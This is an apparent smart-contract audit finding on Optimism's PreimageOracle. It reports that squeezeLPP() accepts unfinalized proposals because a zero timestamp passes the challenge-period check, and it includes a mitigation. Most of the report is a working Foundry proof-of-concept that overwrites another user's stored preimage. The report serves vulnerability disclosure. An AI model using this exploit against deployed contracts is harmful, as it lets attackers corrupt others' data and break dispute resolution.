# #21: `squeezeLPP()` can be called on unfinalized proposals
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sufficient quality report', 'edited-by-warden', ':robot:_39_group', 'duplicate-13']
Accepted: False

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L640-L657


# Vulnerability details

## Impact

In the `PreimageOracle`, the `squeezeLPP()` function is the last step of a large preimage proposal. In this final step, the last merkle leaf of the proposal is absorbed + squeezed to compute the final digest, which is then used for updating the oracle storage values. For someone to call `squeezeLPP()`, there are two checks on the proposal: 

1. A check that no one has countered the proposal by proving it is malicious:

    ```solidity
    if (metaData.countered()) revert BadProposal();
    ```
    
2. A check that the proposal has been finalized for `CHALLENGE_PERIOD` seconds:


    ```solidity
    if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
    ```


There is a mistake with the logic of the second check. If the proposal was never finalized in the first place, the `metaData.timestamp()` value would still be zero, which will trivially pass the timestamp difference check.

This means that an attacker can instantly create a large proposal, partially fill the proposal, and then call `squeezeLPP()` to update the storage mappings. The resulting digest will not match what would be expected from the proposal initialization, and the `proposalParts` may or may not be set at the time of `squeezeLPP()`. All values will be stored as if the proposal was a success.

It is easy to see how this would break the fault dispute game. For example, this would allow changing other users' previously stored preimages (see PoC below), which would lead to users timing-out before they can successfully call `step()` as they expect. 

## Proof of Concept

The following test can be added to `packages/contracts-bedrock/test/cannon/PreimageOracle.t.sol`:

```solidity
function test_squeeze_not_finalized_bug() public {
    /**********************************************************************
    1. Call the existing test function. For the PoC we will show that we can
    instantly change the values that the other test stored.
    **********************************************************************/
    test_squeeze_challengePeriodPassed_succeeds();

    /**********************************************************************
    2. Set up our malicious proposal. We will use the padded version 
    of the other test's data so we can have the same digest
    **********************************************************************/
    bytes memory otherTestData = new bytes(136);
    for (uint256 i; i < otherTestData.length; i++) otherTestData[i] = 0xFF;
    bytes memory attackerData = LibKeccak.padMemory(otherTestData);
    uint256 attackerUUID = TEST_UUID + 1;

    oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(attackerUUID, 0, uint32(attackerData.length));

    LibKeccak.StateMatrix memory matrix;
    {
        bytes32[] memory stateCommitments = _generateStateCommitments(matrix, attackerData);
        bytes32[] memory commitments = new bytes32[](2);
        commitments[0] = stateCommitments[0];
        commitments[1] = stateCommitments[1];
        oracle.addLeavesLPP(attackerUUID, 0, Bytes.slice(attackerData, 0, 136 * 2), commitments, false);
    }

    delete matrix;
    PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, otherTestData);
    bytes32[] memory preProof = new bytes32[](16);
    preProof[0] = _hashLeaf(leaves[1]);
    bytes32[] memory postProof = new bytes32[](16);
    postProof[0] = _hashLeaf(leaves[0]);
    for (uint256 i = 1; i < preProof.length; i++) {
        bytes32 zeroHash = oracle.zeroHashes(i);
        preProof[i] = zeroHash;
        postProof[i] = zeroHash;
    }

    /**********************************************************************
    3. Do the exploit by squeezing before we've finalized the proposal.
    Notice that this changes the values that were stored from the existing
    test, this should never happen
    **********************************************************************/
    // This is the key from the other test
    bytes32 key = _setStatusByte(keccak256(otherTestData), 2);

    // Notice how the other data is already set
    bytes32 partBefore = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (otherTestData.length << 192));
    uint256 lengthBefore = otherTestData.length;
    assertTrue(oracle.preimagePartOk(key, 0));
    assertEq(oracle.preimageLengths(key), lengthBefore);
    assertEq(oracle.preimageParts(key, 0), partBefore);

    // The malicious proposal hasn't finalized yet, but we can still call squeezeLPP()
    assertEq(oracle.proposalMetadata(address(this), attackerUUID).timestamp(), 0);
    oracle.squeezeLPP({
        _claimant: address(this),
        _uuid: attackerUUID,
        _stateMatrix: _stateMatrixAtBlockIndex(otherTestData, 1),
        _preState: leaves[0],
        _preStateProof: preProof,
        _postState: leaves[1],
        _postStateProof: postProof
    });

    // Notice how the squeezeLPP() above affected the mapping
    bytes32 partAfter = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (attackerData.length << 192));
    uint256 lengthAfter = attackerData.length;
    assertTrue(oracle.preimagePartOk(key, 0));
    assertEq(oracle.preimageLengths(key), lengthAfter);
    assertEq(oracle.preimageParts(key, 0), partAfter);

    // The values are different now
    assertTrue(partBefore != partAfter);
    assertTrue(lengthBefore != lengthAfter);
}
```


Running this test with `forge test --match-test test_squeeze_not_finalized_bug` will show a successful result, which demonstrates that another user can have their preimage instantly overwritten.

## Tools Used

Foundry tests.

## Recommended Mitigation Steps

To make the `squeezeLPP()` function revert on proposals that are not finalized, consider the following change:

```diff
// Check if the challenge period has passed since the proposal was finalized.
- if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
+ if (metaData.timestamp() == 0 || block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
```






## Assessed type

Invalid Validation